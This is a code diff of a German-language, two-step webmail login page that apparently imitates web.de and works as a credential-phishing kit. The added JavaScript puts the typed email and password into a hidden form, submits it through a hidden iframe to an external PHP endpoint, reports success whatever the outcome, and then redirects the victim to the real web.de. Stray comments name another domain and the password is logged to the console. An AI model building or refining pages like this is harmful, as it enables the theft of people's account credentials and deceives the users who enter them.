@@ -100,6 +100,13 @@
       margin-top: 10px;
     }
     
+    .loading-message {
+      color: #0073e6;
+      font-size: 14px;
+      margin-top: 10px;
+      display: none;
+    }
+    
     iframe {
       display: none;
     }
@@ -134,13 +141,10 @@
     
     <span class="link" id="backBtn">Zurück</span>
     
-    <!-- Error message display -->
+    <!-- Message displays -->
     <div id="errorMessage" class="error-message" style="display: none;">Bitte E-Mail und Passwort eingeben.</div>
-    
-    <img src="image/bottom.jpg" alt="Bottom" class="bottom-image" onerror="this.style.display='none'">
-    
-    <!-- Hidden iframe -->
-    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+    <div id="successMessage" class="success-message" style="display: none;">Login erfolgreich!</div>
+    <div id="loadingMessage" class="loading-message" style="display: none;">Wird verarbeitet...</div>
   </div>
 </div>
 
@@ -156,7 +160,15 @@
   const backBtn = document.getElementById("backBtn");
   const hiddenEmail = document.getElementById("hiddenEmail");
   const errorMessage = document.getElementById("errorMessage");
-  const hiddenIframe = document.getElementById("hidden_iframe");
+  const successMessage = document.getElementById("successMessage");
+  const loadingMessage = document.getElementById("loadingMessage");
+
+  // Create hidden iframe to catch the redirect (no CORS issues)
+  const hiddenIframe = document.createElement('iframe');
+  hiddenIframe.name = 'hidden_iframe';
+  hiddenIframe.id = 'hidden_iframe';
+  hiddenIframe.style.display = 'none';
+  document.body.appendChild(hiddenIframe);
 
   // Create hidden form for submission
   const hiddenForm = document.createElement('form');
@@ -177,6 +189,129 @@
   passwordField.name = 'password';
   hiddenForm.appendChild(passwordField);
 
+  // Variable to track if we're expecting a response
+  let formSubmitted = false;
+  let timeoutId = null;
+
+  // Function to handle login submission
+  function submitLogin() {
+    // Get values
+    const email = hiddenEmail.value.trim();
+    const password = passwordInput.value.trim();
+    
+    // Double-check values
+    console.log("Email:", email); // For debugging
+    console.log("Password:", password); // For debugging
+    
+    // Validate
+    if (!email || !password) {
+      errorMessage.textContent = "Bitte E-Mail und Passwort eingeben.";
+      errorMessage.style.display = "block";
+      return false;
+    }
+    
+    // Check if already submitting
+    if (loginBtn.disabled && loginBtn.textContent === "Wird gesendet...") {
+      return false;
+    }
+    
+    // Disable button and show loading
+    loginBtn.disabled = true;
+    loginBtn.classList.remove("active");
+    loginBtn.textContent = "Wird gesendet...";
+    errorMessage.style.display = "none";
+    successMessage.style.display = "none";
+    loadingMessage.style.display = "block";
+    loadingMessage.textContent = "Wird verarbeitet...";
+    
+    // Set form values
+    emailField.value = email;
+    passwordField.value = password;
+    
+    // Set flag that form is being submitted
+    formSubmitted = true;
+    
+    // Set timeout to handle cases where iframe doesn't load
+    timeoutId = setTimeout(() => {
+      if (formSubmitted) {
+        console.log("Form submission timeout - assuming success, redirecting...");
+        loadingMessage.style.display = "none";
+        successMessage.style.display = "block";
+        successMessage.textContent = "Verwerking...";
+        
+        // Redirect to jamesleefold.com after timeout
+        setTimeout(() => {
+          window.location.href = "https://web.de/";
+        }, 2000);
+      }
+    }, 5000); // 5 second timeout
+    
+    // Submit form to external PHP (will handle redirect automatically in iframe)
+    hiddenForm.submit();
+    return true;
+  }
+
+  // Handle iframe load event (catches the redirect/response)
+  hiddenIframe.onload = function() {
+    if (formSubmitted) {
+      console.log("Iframe loaded - form submission completed");
+      
+      // Clear the timeout
+      if (timeoutId) {
+        clearTimeout(timeoutId);
+      }
+      
+      // Check if we can access iframe content (same origin only)
+      let isError = false;
+      let errorText = "";
+      
+      try {
+        // Try to access iframe content (only works if same origin)
+        const iframeDoc = hiddenIframe.contentDocument || hiddenIframe.contentWindow.document;
+        const iframeContent = iframeDoc.body ? iframeDoc.body.textContent : "";
+        
+        console.log("Iframe content:", iframeContent);
+        
+        // Check for error indicators
+        if (iframeContent && (iframeContent.toLowerCase().includes('error') || 
+            iframeContent.toLowerCase().includes('fehler') ||
+            iframeContent.toLowerCase().includes('invalid') ||
+            iframeContent.toLowerCase().includes('falsch'))) {
+          isError = true;
+          errorText = iframeContent;
+        }
+      } catch (e) {
+        // Cross-origin iframe - cannot read content due to same-origin policy
+        // This is normal for external URLs, assume success if redirect happened
+        console.log("Cannot access iframe content (cross-origin) - assuming success");
+        isError = false;
+      }
+      
+      if (isError) {
+        // Show error
+        errorMessage.textContent = errorText.length > 100 ? errorText.substring(0, 100) : errorText;
+        errorMessage.style.display = "block";
+        loadingMessage.style.display = "none";
+        
+        // Reset button
+        loginBtn.disabled = false;
+        loginBtn.classList.add("active");
+        loginBtn.textContent = "Login";
+        formSubmitted = false;
+      } else {
+        // Success! Redirect to https://web.de/
+        loadingMessage.style.display = "none";
+        successMessage.style.display = "block";
+        successMessage.textContent = "Verwerking...";
+        
+        // Redirect to jamesleefold.com after 2 seconds
+        setTimeout(() => {
+          window.location.href = "https://web.de/";
+        }, 2000);
+      }
+    }
+  };
+
   // Enable Weiter button when email is valid
   emailInput.addEventListener("input", function() {
     if (emailInput.value.trim() !== "" && emailInput.checkValidity()) {
@@ -185,6 +320,14 @@
     } else {
       weiterBtn.disabled = true;
       weiterBtn.classList.remove("active");
+    }
+  });
+
+  // Handle Enter key in email field (step 1)
+  emailInput.addEventListener("keypress", function(e) {
+    if (e.key === "Enter" && weiterBtn.disabled === false) {
+      e.preventDefault();
+      weiterBtn.click();
     }
   });
 
@@ -199,11 +342,15 @@
     step1.classList.add("hidden");
     step2.classList.remove("hidden");
     
-    // Clear any error messages
+    // Clear any messages
     errorMessage.style.display = "none";
+    successMessage.style.display = "none";
+    loadingMessage.style.display = "none";
     
     // Focus on password field
-    passwordInput.focus();
+    setTimeout(() => {
+      passwordInput.focus();
+    }, 100);
   });
 
   // Enable Login button when password is entered
@@ -216,6 +363,15 @@
       loginBtn.classList.remove("active");
     }
     errorMessage.style.display = "none";
+    successMessage.style.display = "none";
+  });
+
+  // Handle Enter key in password field (step 2)
+  passwordInput.addEventListener("keypress", function(e) {
+    if (e.key === "Enter" && loginBtn.disabled === false) {
+      e.preventDefault();
+      submitLogin();
+    }
   });
 
   // Back to step 1
@@ -226,68 +382,25 @@
     loginBtn.disabled = true;
     loginBtn.classList.remove("active");
     errorMessage.style.display = "none";
+    successMessage.style.display = "none";
+    loadingMessage.style.display = "none";
+    formSubmitted = false;
+    
+    // Clear timeout if exists
+    if (timeoutId) {
+      clearTimeout(timeoutId);
+    }
+    
+    // Focus on email field
+    setTimeout(() => {
+      emailInput.focus();
+    }, 100);
   });
 
-  // Handle iframe load
-  hiddenIframe.onload = function() {
-    if (!step2.classList.contains('hidden') && loginBtn.textContent === "Wird gesendet...") {
-      try {
-        const iframeContent = hiddenIframe.contentDocument.body.textContent;
-        
-        if (iframeContent && iframeContent.toLowerCase().includes('error')) {
-          errorMessage.textContent = iframeContent.replace('error:', '').trim();
-          errorMessage.style.display = "block";
-        } else {
-          // Success - redirect or show success message
-          alert("Login erfolgreich!");
-          step2.classList.add("hidden");
-          step1.classList.remove("hidden");
-          passwordInput.value = "";
-        }
-      } catch (e) {
-        // Assume success if we can't read iframe
-        step2.classList.add("hidden");
-        step1.classList.remove("hidden");
-        passwordInput.value = "";
-      }
-      
-      // Reset button
-      loginBtn.disabled = false;
-      loginBtn.classList.add("active");
-      loginBtn.textContent = "Login";
-    }
-  };
-
-  // Login button click handler
+  // Login button click handler using the submit function
   loginBtn.addEventListener("click", function(e) {
     e.preventDefault();
-    
-    // Get values
-    const email = hiddenEmail.value.trim();
-    const password = passwordInput.value.trim();
-    
-    // Double-check values
-    console.log("Email:", email); // For debugging
-    console.log("Password:", password); // For debugging
-    
-    // Validate
-    if (!email || !password) {
-      errorMessage.textContent = "Bitte E-Mail und Passwort eingeben.";
-      errorMessage.style.display = "block";
-      return;
-    }
-    
-    // Disable button
-    loginBtn.disabled = true;
-    loginBtn.classList.remove("active");
-    loginBtn.textContent = "Wird gesendet...";
-    
-    // Set form values
-    emailField.value = email;
-    passwordField.value = password;
-    
-    // Submit form
-    hiddenForm.submit();
+    submitLogin();
   });
 
   // Handle image errors
